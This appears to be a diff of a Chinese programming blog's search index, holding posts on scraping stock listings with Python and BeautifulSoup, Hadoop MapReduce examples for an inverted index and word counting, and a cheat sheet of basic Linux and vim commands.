class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-爬取股票数据2"><a href="#0x03-爬取股票数据2" class="headerlink" title="0x03 爬取股票数据2"></a>0x03 爬取股票数据2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#CrawBaiduStocksB.py</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import traceback</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def getHTMLText(url, code=&quot;utf-8&quot;):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = code</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;&quot;</span><br><span class="line"></span><br><span class="line">def getStockList(lst, stockURL):</span><br><span class="line">    html = getHTMLText(stockURL, &quot;GB2312&quot;)</span><br><span class="line">    soup = BeautifulSoup(html, &apos;html.parser&apos;) </span><br><span class="line">    a = soup.find_all(&apos;a&apos;)</span><br><span class="line">    for i in a:</span><br><span class="line">        try:</span><br><span class="line">            href = i.attrs[&apos;href&apos;]</span><br><span class="line">            lst.append(re.findall(r&quot;[s][hz]\d&#123;6&#125;&quot;, href)[0])</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def getStockInfo(lst, stockURL, fpath):</span><br><span class="line">    count = 0</span><br><span class="line">    for stock in lst:</span><br><span class="line">        url = stockURL + stock + &quot;.html&quot;</span><br><span class="line">        html = getHTMLText(url)</span><br><span class="line">        try:</span><br><span class="line">            if html==&quot;&quot;:</span><br><span class="line">                continue</span><br><span class="line">            infoDict = &#123;&#125;</span><br><span class="line">            soup = BeautifulSoup(html, &apos;html.parser&apos;)</span><br><span class="line">            stockInfo = soup.find(&apos;div&apos;,attrs=&#123;&apos;class&apos;:&apos;stock-bets&apos;&#125;)</span><br><span class="line"></span><br><span class="line">            name = stockInfo.find_all(attrs=&#123;&apos;class&apos;:&apos;bets-name&apos;&#125;)[0]</span><br><span class="line">            infoDict.update(&#123;&apos;股票名称&apos;: name.text.split()[0]&#125;)</span><br><span class="line">            </span><br><span class="line">            keyList = stockInfo.find_all(&apos;dt&apos;)</span><br><span class="line">            valueList = stockInfo.find_all(&apos;dd&apos;)</span><br><span class="line">            for i in range(len(keyList)):</span><br><span class="line">                key = keyList[i].text</span><br><span class="line">                val = valueList[i].text</span><br><span class="line">                infoDict[key] = val</span><br><span class="line">            </span><br><span class="line">            with open(fpath, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">                f.write( str(infoDict) + &apos;\n&apos; )</span><br><span class="line">                count = count + 1</span><br><span class="line">                print(&quot;\r当前进度: &#123;:.2f&#125;%&quot;.format(count*100/len(lst)),end=&quot;&quot;)</span><br><span class="line">        except:</span><br><span class="line">            count = count + 1</span><br><span class="line">            print(&quot;\r当前进度: &#123;:.2f&#125;%&quot;.format(count*100/len(lst)),end=&quot;&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stock_list_url = &apos;http://quote.eastmoney.com/stocklist.html&apos;</span><br><span class="line">    stock_info_url = &apos;https://gupiao.baidu.com/stock/&apos;</span><br><span class="line">    output_file = &apos;D:/BaiduStockInfo.txt&apos;</span><br><span class="line">    slist=[]</span><br><span class="line">    getStockList(slist, stock_list_url)</span><br><span class="line">    getStockInfo(slist, stock_info_url, output_file)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>tool</category>
+      </categories>
+      <tags>
+        <tag>beautifulSoup</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hadoop03-InvertIndex</title>
+    <url>/2020/01/07/hadoop03-InvertIndex/</url>
+    <content><![CDATA[<p>hadoop应用实例：倒排索引</p>
+<a id="more"></a>
+<h1 id="0x00问题描述"><a href="#0x00问题描述" class="headerlink" title="0x00问题描述"></a>0x00问题描述</h1><p>先看一个具体例子，我们有三个文件，如下所示。<br>file1.txt内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mapreduce is simple</span><br></pre></td></tr></table></figure>
+
+<p>file2.txt内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mapreduce is powerful and simple</span><br></pre></td></tr></table></figure>
+
+<p>file3.txt内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mapreduce and mapreduce</span><br></pre></td></tr></table></figure>
+
+<p>建立倒排索引之后应该是这样的。每一行第一个是一个单词，然后后面的字符是其出现在的文件及其出现的次数(表示权重)。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and file3.txt:1;file2.txt:1;</span><br><span class="line">is file2.txt:1;file1.txt:1;</span><br><span class="line">mapreduce file1.txt:1;file2.txt:1;file3.txt:2;</span><br><span class="line">powerful file2.txt:1;</span><br><span class="line">simple file2.txt:1;file1.txt:1;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-mapReduce实现"><a href="#0x01-mapReduce实现" class="headerlink" title="0x01 mapReduce实现"></a>0x01 mapReduce实现</h1><p>具体需要导入的包见<code>hadoop02-wordCount</code></p>
+<h2 id="map函数及其实现"><a href="#map函数及其实现" class="headerlink" title="map函数及其实现"></a>map函数及其实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class Map extends Mapper&lt;Object, Text, Text, Text&gt; &#123;</span><br><span class="line">       private Text keyInfo = new Text(); // 存储单词和URL组合</span><br><span class="line">       private Text valueInfo = new Text(); // 存储词频</span><br><span class="line">       private FileSplit split; // 存储Split对象</span><br><span class="line">       // 实现map函数</span><br><span class="line">       @Override</span><br><span class="line">       public void map(Object key, Text value, Context context) throws IOException, InterruptedException &#123;</span><br><span class="line">           // 获得&lt;key,value&gt;对所属的FileSplit对象</span><br><span class="line">           split = (FileSplit) context.getInputSplit();</span><br><span class="line">           StringTokenizer itr = new StringTokenizer(value.toString());</span><br><span class="line">           while (itr.hasMoreTokens()) &#123;</span><br><span class="line">               // key值由单词和文件名组成, value 值初始化为 1. 组成key-value对:</span><br><span class="line">               // 如: (MapReduce:file1.txt, 1)</span><br><span class="line"></span><br><span class="line">               String pathname=split.getPath().getName();  //获取目录名字</span><br><span class="line">               String thisKet = itr.nextToken() + &quot;:&quot;+ pathname;</span><br><span class="line">               keyInfo.set(thisKet);</span><br><span class="line">               valueInfo.set(&quot;1&quot;);</span><br><span class="line">               context.write(keyInfo, valueInfo);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>word:fileName作为key，词频作为value输出。</p>
+<h2 id="combine函数及其实现"><a href="#combine函数及其实现" class="headerlink" title="combine函数及其实现"></a>combine函数及其实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class Combine extends Reducer&lt;Text, Text, Text, Text&gt; &#123;</span><br><span class="line">        private Text info = new Text();</span><br><span class="line">        // 实现reduce函数， 将相同key值的value加起来</span><br><span class="line">        // 并将(单词:文件名, value) 转换为 （单词， 文件名:value）</span><br><span class="line">        @Override</span><br><span class="line">        public void reduce(Text key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123;</span><br><span class="line">            // 统计词频</span><br><span class="line">            int sum = 0;</span><br><span class="line">            for (Text val : values)&#123;</span><br><span class="line">                sum += Integer.parseInt(val.toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 重新设置value值由URL和词频组成</span><br><span class="line">            String[] splitValue = key.toString().split(&quot;:&quot;);</span><br><span class="line">            String newValue = splitValue[1]+&quot;:&quot;+ String.valueOf(sum);</span><br><span class="line">            info.set(newValue);</span><br><span class="line">            // 重新设置key值为单词</span><br><span class="line">            key.set(splitValue[0]);</span><br><span class="line">            context.write(key, info);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>统计词频，并且将(key,value)转换。</p>
+<h2 id="reduce-函数及其实现"><a href="#reduce-函数及其实现" class="headerlink" title="reduce 函数及其实现"></a>reduce 函数及其实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class Reduce extends Reducer&lt;Text, Text, Text, Text&gt; &#123;</span><br><span class="line">        private Text result = new Text();</span><br><span class="line">        // 实现reduce函数, 将相同单词的value聚合成一个总的value，每个value之间用`;`隔开, 最后以`;`结尾</span><br><span class="line">        @Override</span><br><span class="line">        public void reduce(Text key, Iterable&lt;Text&gt; values, Context context) throws IOException, InterruptedException &#123;</span><br><span class="line">            String item= &quot;&quot;;</span><br><span class="line">            for(Text value : values)&#123;</span><br><span class="line">                item = item + value.toString()+ &quot;;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            result.set(item.trim());</span><br><span class="line">            context.write(key, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="main方法及其配置"><a href="#main方法及其配置" class="headerlink" title="main方法及其配置"></a>main方法及其配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 第一个参数为 输入文件目录路径， 第二个参数为输出结果路径</span><br><span class="line">        Configuration conf = new Configuration();</span><br><span class="line">        conf.set(&quot;fs.defaultFS&quot;, &quot;hdfs://localhost:9000&quot;);</span><br><span class="line">        conf.set(&quot;fs.hdfs.impl&quot;, &quot;org.apache.hadoop.hdfs.DistributedFileSystem&quot;);</span><br><span class="line"></span><br><span class="line">       /* if (args.length != 2) &#123;</span><br><span class="line">            System.err.println(&quot;Usage: Inverted Index &lt;in&gt; &lt;out&gt;&quot;);</span><br><span class="line">            System.exit(2);</span><br><span class="line">        &#125;*/</span><br><span class="line"></span><br><span class="line">        Job job = new Job(conf, &quot;Inverted Index&quot;);</span><br><span class="line">        job.setJarByClass(InvertIndex_origin.class);</span><br><span class="line"></span><br><span class="line">        // 设置Map、Combine和Reduce处理类</span><br><span class="line">        job.setMapperClass(Map.class);</span><br><span class="line">        job.setCombinerClass(Combine.class);</span><br><span class="line">        job.setReducerClass(Reduce.class);</span><br><span class="line"></span><br><span class="line">        // 设置Map输出类型</span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(Text.class);</span><br><span class="line"></span><br><span class="line">        // 设置Reduce输出类型</span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(Text.class);</span><br><span class="line"></span><br><span class="line">        // 设置输入和输出目录</span><br><span class="line">        String input_path = &quot;/input&quot;;</span><br><span class="line">        String out_path = &quot;/output&quot;;</span><br><span class="line">        FileInputFormat.addInputPath(job, new Path(input_path));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, new Path(out_path));</span><br><span class="line">        System.exit(job.waitForCompletion(true) ? 0 : 1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>bigdata</category>
+      </categories>
+      <tags>
+        <tag>hadoop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hadoop02-wordCount</title>
+    <url>/2020/01/07/hadoop02-wordCount/</url>
+    <content><![CDATA[<p>hadoop的一个应用实例：词频统计及其理论介绍</p>
+<a id="more"></a>
+<h1 id="0x00-实例代码"><a href="#0x00-实例代码" class="headerlink" title="0x00 实例代码"></a>0x00 实例代码</h1><p>一个简单介绍MapReduce技术的<a href="https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.824e244b8wdsOb#_15663" target="_blank" rel="noopener">文档</a><br>见官网提供的词频统计示例：<a href="https://hadoop.apache.org/docs/r2.7.2/hadoop-mapreduce-client/hadoop-mapreduce-client-core/MapReduceTutorial.html" target="_blank" rel="noopener">官网词频统计</a></p>
+<h2 id="一个测试用例"><a href="#一个测试用例" class="headerlink" title="一个测试用例"></a>一个测试用例</h2><p>test.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bye GoogBye Hadoop Hello Word Hadoop Word</span><br></pre></td></tr></table></figure>
+
+<h2 id="首先实现一个Mapper类"><a href="#首先实现一个Mapper类" class="headerlink" title="首先实现一个Mapper类"></a>首先实现一个Mapper类</h2><p>具体需要导入的包见官方示例。这里用到的都是hadoop中重新定义的类型，保证能序列化和反序列化。<br>对应如下：</p>
+<blockquote>
+<p>Long === LongWritable<br>String === Text<br>Integer === IntWritable</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class TokenizerMapper</span><br><span class="line">       extends Mapper&lt;Object, Text, Text, IntWritable&gt;&#123;</span><br><span class="line"></span><br><span class="line">    private final static IntWritable one = new IntWritable(1);</span><br><span class="line">    private Text word = new Text();</span><br><span class="line"></span><br><span class="line">    public void map(Object key, Text value, Context context</span><br><span class="line">                    ) throws IOException, InterruptedException &#123;</span><br><span class="line">      StringTokenizer itr = new StringTokenizer(value.toString());</span><br><span class="line">      while (itr.hasMoreTokens()) &#123;</span><br><span class="line">        word.set(itr.nextToken());</span><br><span class="line">        context.write(word, one);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法定义的输入是<code>&lt;Object, Text&gt;</code>，输出是<code>&lt;Text, IntWritable&gt;</code>。StringTokenizer是<code>java.util</code>包下分割字符串工具。通过write方法将结果输出到文件中去。<br>该map输出结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; Bye, 1&gt;</span><br><span class="line">&lt; GoodBye, 1&gt;</span><br><span class="line">&lt;Hadoop, (1,1)&gt;</span><br><span class="line">&lt; Hello, 1&gt;</span><br><span class="line">&lt; World, (1,1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果设置了combiner操作<code>job.setCombinerClass(IntSumReducer.class)</code>，则会进行合并操作。<strong>每次运行完map，会对输出按照key进行排序，把输出传递给本地combiner，进行本地聚合。</strong><br>可以见到，词频统计的combiner和reduce操作是一样的流程。combiner（按照配置可以知道和reduce一样），<br>经过combiner后，map输出如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; Bye, 1&gt;</span><br><span class="line">&lt; GoodBye, 1&gt;</span><br><span class="line">&lt;Hadoop, 2&gt;</span><br><span class="line">&lt; Hello, 1&gt;</span><br><span class="line">&lt; World, 2&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="实现一个Reduce类"><a href="#实现一个Reduce类" class="headerlink" title="实现一个Reduce类"></a>实现一个Reduce类</h2><p>经过map和combiner后，reduce收到的数据是这样的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Bye, [1]&gt;</span><br><span class="line">&lt;GoodBye, [1]&gt;</span><br><span class="line">&lt;Hadoop, [1,1]&gt;</span><br><span class="line">&lt;hello, [1]&gt;</span><br><span class="line">&lt;World, [1]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后进行reduce操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static class IntSumReducer</span><br><span class="line">      extends Reducer&lt;Text,IntWritable,Text,IntWritable&gt; &#123;</span><br><span class="line">   private IntWritable result = new IntWritable();</span><br><span class="line"></span><br><span class="line">   public void reduce(Text key, Iterable&lt;IntWritable&gt; values,</span><br><span class="line">                      Context context</span><br><span class="line">                      ) throws IOException, InterruptedException &#123;</span><br><span class="line">     int sum = 0;</span><br><span class="line">     for (IntWritable val : values) &#123;</span><br><span class="line">       sum += val.get();</span><br><span class="line">     &#125;</span><br><span class="line">     result.set(sum);</span><br><span class="line">     context.write(key, result);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>将相同key的值进行操作，对不同map的输出进行汇总。</p>
+<h2 id="编写main方法"><a href="#编写main方法" class="headerlink" title="编写main方法"></a>编写main方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">   Configuration conf = new Configuration();</span><br><span class="line">   Job job = Job.getInstance(conf, &quot;word count&quot;);</span><br><span class="line">   job.setJarByClass(WordCount.class);</span><br><span class="line">   job.setMapperClass(TokenizerMapper.class);</span><br><span class="line">   job.setCombinerClass(IntSumReducer.class);</span><br><span class="line">   job.setReducerClass(IntSumReducer.class);</span><br><span class="line">   job.setOutputKeyClass(Text.class);</span><br><span class="line">   job.setOutputValueClass(IntWritable.class);</span><br><span class="line">   FileInputFormat.addInputPath(job, new Path(args[0]));</span><br><span class="line">   FileOutputFormat.setOutputPath(job, new Path(args[1]));</span><br><span class="line">   System.exit(job.waitForCompletion(true) ? 0 : 1);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法使设置job的一些配置，主要涉及map类，reduce类。输出的key, value类型。设置作业的输入，输出路径。<br>要想程序能跟运行，还需要连接hdfs系统。有两种方法，把core.xml放到资源文件下，或加入如下的代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conf.set(&quot;fs.defaultFS&quot;, &quot;hdfs://localhost:9000&quot;);</span><br><span class="line">conf.set(&quot;fs.hdfs.impl&quot;, &quot;org.apache.hadoop.hdfs.DistributedFileSystem&quot;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x01-一些问题"><a href="#0x01-一些问题" class="headerlink" title="0x01 一些问题"></a>0x01 一些问题</h1><p>Q1:为什么不用JAVA的序列化？<br>A1：java序列化是一个重量级框架(Serializable)，一个对象序列化后有许多额外的信息如校验信息，Header，继承体系)。不便在网络中高效传输，所以Hadoop开发了自己的序列化机制(Writable)。</p>
+<p>Q2: mapreduce有哪些进程<br>A2: 有三类实例进程：</p>
+<blockquote>
+<ul>
+<li>MrAppMaster: 负责过程调度及状态协调</li>
+<li>MapTask: 负责Map阶段的数据处理流程</li>
+<li>ReduceTask: 负责Reduce阶段的整个数据处理流程，对每一组相同的&lt;k,v&gt;调用一次reduce方法。</li>
+</ul>
+</blockquote>
+<h1 id="0x02-mapReduce框架原理"><a href="#0x02-mapReduce框架原理" class="headerlink" title="0x02 mapReduce框架原理"></a>0x02 mapReduce框架原理</h1><h2 id="InputFormat数据输入"><a href="#InputFormat数据输入" class="headerlink" title="InputFormat数据输入"></a>InputFormat数据输入</h2><p>数据块：Block是HDFS在物理上把数据分成一块一块。<br>数据切片：在逻辑上对输入进行分片。<br>一个Job的map阶段并行度由客户端在提交Job时的切片数决定，每一个Split切片分配一个MapTask实例。切片是针对每一个文件单独切片。</p>
+<h1 id="0x03-mapReduce开发过程"><a href="#0x03-mapReduce开发过程" class="headerlink" title="0x03 mapReduce开发过程"></a>0x03 mapReduce开发过程</h1><h2 id="1-输入数据接口：InputFormat"><a href="#1-输入数据接口：InputFormat" class="headerlink" title="1. 输入数据接口：InputFormat"></a>1. 输入数据接口：InputFormat</h2><ul>
+<li>默认使用实现类是<code>TextInputFormat</code>：一次读一行文本，然后将该行的起始字节偏移量作为key，行内容(不包括换行和回车)作为value值返回。</li>
+<li><code>KeyValueTextInputFormat</code>每一行均为一条记录，被分割符分割为key，value。默认分隔符是tab(‘\t’)。</li>
+<li><code>NlineInputFormat</code>按照指定的行数N来划分切片，每一个切片对应一个MapTask。</li>
+<li><code>CombineTextInputFormat</code>把多个小文件合并成一个切片处理，提高处理效率。</li>
+<li>用户可以自定义<code>InputFormat</code>。</li>
+</ul>
+<h2 id="2-逻辑处理接口-Mapper"><a href="#2-逻辑处理接口-Mapper" class="headerlink" title="2. 逻辑处理接口:Mapper"></a>2. 逻辑处理接口:Mapper</h2><p>用户根据业务需求有选择的实现三个方法：<code>map()</code>，<code>setup()</code>，<code>cleanup()</code></p>
+<h2 id="3-Partitioner分区"><a href="#3-Partitioner分区" class="headerlink" title="3. Partitioner分区"></a>3. Partitioner分区</h2><ul>
+<li>有默认实现<code>HashPartitioner</code>，根据key的哈希值和numReduces返回一个分区号。用户无法控制哪个key存储到那个分区。</li>
+<li>也可以自定义分区。</li>
+</ul>
+<h2 id="4-Comparable排序"><a href="#4-Comparable排序" class="headerlink" title="4. Comparable排序"></a>4. Comparable排序</h2><p>用自定义对象作为key来输出是，就必须实现WritableComparable接口，重写其中的compareTo()方法。<br>部分排序：对最终输出的每一个文件进行内部排序。<br>全排序：对所有数据进行排序，通常只有一个Reduce。<br>二次排序：排序条件有两个。</p>
+<h2 id="5-Combiner合并"><a href="#5-Combiner合并" class="headerlink" title="5. Combiner合并"></a>5. Combiner合并</h2><p>提高执行效率，减少IO开销</p>
+<h2 id="6-Reduce端分组：GroupingComparator"><a href="#6-Reduce端分组：GroupingComparator" class="headerlink" title="6.Reduce端分组：GroupingComparator"></a>6.Reduce端分组：GroupingComparator</h2><p>在Reduce端进行key分组。应用于接受key为对象时，想让一个或几个字段相同的key进入同一个reduce方法。</p>
+<h2 id="7-逻辑处理接口"><a href="#7-逻辑处理接口" class="headerlink" title="7.逻辑处理接口"></a>7.逻辑处理接口</h2><p>根据业务需求实现三个方法：<code>reduce()</code>, <code>setup()</code>, <code>cleanup()</code>。</p>
+<h2 id="8-数据输出接口"><a href="#8-数据输出接口" class="headerlink" title="8.数据输出接口"></a>8.数据输出接口</h2><ul>
+<li>默认实现是<code>TextOutputFormat</code>，将每一个kv对，向目标文件中输出一行。</li>
+<li><code>SequenceFileOutputFormat</code>输出作为后续MapReduce任务的输入。</li>
+<li>可以自定义<code>OutputFormat</code></li>
+</ul>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.824e244b8wdsOb#_15663" target="_blank" rel="noopener">https://edu.aliyun.com/lesson_1802_15663?spm=5176.10731542.0.0.824e244b8wdsOb#_15663</a></p>
+]]></content>
+      <categories>
+        <category>bigdata</category>
+      </categories>
+      <tags>
+        <tag>hadoop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux-basic</title>
+    <url>/2019/12/07/linux-basic/</url>
+    <content><![CDATA[<p>Linux入门<br>学习linux的一些基本操作</p>
+<a id="more"></a>
+<p>更改主机名<br><code>hostname</code>查看主机名<br><code>hostname Name</code>临时更改<br><code>vim /etc/hostname</code>永久修改</p>
+<h1 id="0x00-文件操作"><a href="#0x00-文件操作" class="headerlink" title="0x00 文件操作"></a>0x00 文件操作</h1><h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>功能：用于目录或者文件的复制<br>格式：<code>cp [options] file destination</code><br>举例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp a.txt b.txt    重新创建新的时间戳</span><br><span class="line">cp -p a.txt b.txt 不改变时间戳，所属用户</span><br><span class="line">cp -r a b         递归复制，用于文件夹</span><br></pre></td></tr></table></figure>
+
+<h2 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h2><p>功能：移动和重命名文件或者目录<br>格式：<code>mv [option] src des</code><br>举例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv a ab 重命名</span><br><span class="line">mv a ../ 移动a到上层目录</span><br></pre></td></tr></table></figure>
+
+<h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><p><code>rm -rf filename</code></p>
+<h1 id="0x01系统管理"><a href="#0x01系统管理" class="headerlink" title="0x01系统管理"></a>0x01系统管理</h1><h2 id="监控系统状态"><a href="#监控系统状态" class="headerlink" title="监控系统状态"></a>监控系统状态</h2><h3 id="w命令"><a href="#w命令" class="headerlink" title="w命令"></a>w命令</h3><p>功能：查看系统当前负载<br>时间，系统运行时间，登陆用户数，平均负载。<br>这里特别要注意评价负载中的第一个值：表示1分钟内的系统评价负载(单位时间内使用CPU的活动进程数)。如果小于CPU的数量就OK，否则系统有压力。</p>
+<blockquote>
+<p>查看CPU的个数/核: <code>cat /proc/cpuinfo</code></p>
+</blockquote>
+<h3 id="vmstat"><a href="#vmstat" class="headerlink" title="vmstat"></a>vmstat</h3><p>功能：监控系统状态<br>用法：不加参数不会刷新，加参数会刷新<code>vmstat 1</code>(1秒刷新一次)，或者<code>vmstat 1 5</code>刷新五次<br>解释：</p>
+<ul>
+<li>r:运行或者等待CPU时间片的进程数，等待非CPU资源的进程数。</li>
+<li>swpd:切换到变换分区的内存数量(KB)，free:空闲内存数(KB)，buff:将写入磁盘缓冲大小的数(KB)，cache:磁盘读取的缓冲大小(KB)</li>
+<li>si:变换区写入内存的大小(KB，)，so:内存写入变换区的数量，<strong>值大说明内存不够</strong></li>
+<li>bi:从块设备中读取的数据量KB，bo:写入块设备的数据量。</li>
+<li>in:某一个时间间隔观测到的每秒设备中断次数，cs:每秒产生上下文切换次数</li>
+<li>us:用户所花费CPU时间百分比，sy：系统花费CPU时间百分比，id：cpu处于空闲时间段的百分比，wa：IO等待所占用CPU百分比，st：被偷走的CPU所占百分比。</li>
+</ul>
+<h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>功能：显示进程所占系统资源，3s变换一次<br>占用系统资源（CPU，内存，磁盘）最高进程放前面<br><code>top -bn1</code>非动态打印使用情况。</p>
+<h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>功能：查看内存使用情况<br><code>free -h</code></p>
+<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>查看系统所有进程<br><code>ps aux</code>和<code>ps au</code><br>暴力删掉进程：<code>kill -9 PID</code><br>进程状态：D:不能中断的进程，R:正在运行的进程，S：已经中断的进程，s:主进程，T:已经停止暂停的进程，z:僵尸进程，&lt;：高优先级进程，l:多线程进程，+：前台运行的进程</p>
+<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>功能：查看网络连接状况，系统开发端口，路由表等信息</p>
+<p><code>netstat -lnp</code>该命令表示系统系统启用的端口<br><code>netstat -lnp | head -n30</code><br>上面一部分监听TCP/IP，下面监听Socket(unix开头)<br><code>netstat -an</code> 查看网络连接状况<br>如<code>netstat -an | grep 80</code>可以查看web服务器连接的IP</p>
+<h2 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h2><h3 id="查看磁盘"><a href="#查看磁盘" class="headerlink" title="查看磁盘"></a>查看磁盘</h3><p><code>df -h</code>或者<code>df -h | grep -v tmpfs</code></p>
+<h3 id="查看文件或者目录"><a href="#查看文件或者目录" class="headerlink" title="查看文件或者目录"></a>查看文件或者目录</h3><p><code>du -sh filename</code></p>
+<h1 id="0x02文本编辑"><a href="#0x02文本编辑" class="headerlink" title="0x02文本编辑"></a>0x02文本编辑</h1><p>这里介绍的是vi或则vim编辑器，涉及到命令模式，编辑模式</p>
+<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><p><code>vim test.txt</code> 打开文件定位到第一行行首<br><code>vim test.txt +6</code>打开文件并且定位于第6行<br><code>vim test.txt +</code> 打开文件并且定位于最后一行<br><code>vim test.txt +/pattern</code> 打开文件并且定位到第一次匹配到pattern的行首</p>
+<h2 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h2><p><code>h</code>左，<code>l</code>右，<code>k</code>上，<code>j</code>下<br><code>ctrl+B</code>向前翻一页，<code>ctrl+F</code>向后翻一页，<code>gg</code>首行，<code>G</code>行尾，<code>nG</code>任意行(n为数字)<br><code>shift+6</code>本行行首，<code>shift+4</code>本行行尾</p>
+<h2 id="进入编辑模式"><a href="#进入编辑模式" class="headerlink" title="进入编辑模式"></a>进入编辑模式</h2><p><code>i</code>向前插入，<code>a</code>向后插入，<code>I</code>行首插入，<code>A</code>行尾插入，<code>o</code>下一行插入，<code>O</code>上一行插入</p>
+<h2 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h2><p><code>x</code>向后删除一个字符，<code>X</code>向前删除一个字符，<code>nx</code>向后删除n个字符<br><code>dd</code>剪切光标所在行，<code>ndd</code>向后剪切n行<br><code>yy</code>复制光标所在行，<code>nyy</code>向后复制n行<br><code>p</code>向光标所在行下复制，<code>P</code>向上复制<br><code>u</code>还原上一步操作，<code>v</code>选定字符</p>
+<h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p><code>:set nu</code>显示行号，<code>:w</code>保存，<code>:w!</code>强制保存，<code>:wq</code>保存并推出，<code>:q!</code>强退，改动不生效，<code>:set nonu</code>不显示行号，<code>:!cmd</code>执行shell命令<br><code>:set paste</code>粘贴<br><code>/word</code>向光标后查询word，n向后搜索<br><code>?word</code>向光标前查询word，n向前搜索<br><code>:n1,n2s/word1/word2/g</code>n1和n2行之间查询word1并替换为word2，不加g只替换每行第一个<br><code>:1,$s/word1/word2/g</code>全文查询word1并替换为word2，不加g只替换每行第一个</p>
+<h1 id="0x03压缩与打包"><a href="#0x03压缩与打包" class="headerlink" title="0x03压缩与打包"></a>0x03压缩与打包</h1><p>一些格式：<br><code>.gz</code>使用gzip压缩的文件，<code>.bz2</code>使用bizp2压缩的文件，<code>.tar</code>使用tar打包的文件或者目录，无压缩功能<br><code>.tar.gz</code>先tar打包，再gzip压缩，<code>.tar.bz2</code>先tar打包，再bzip2压缩，<code>.tar.xz</code>先tar打包，再xz压缩</p>
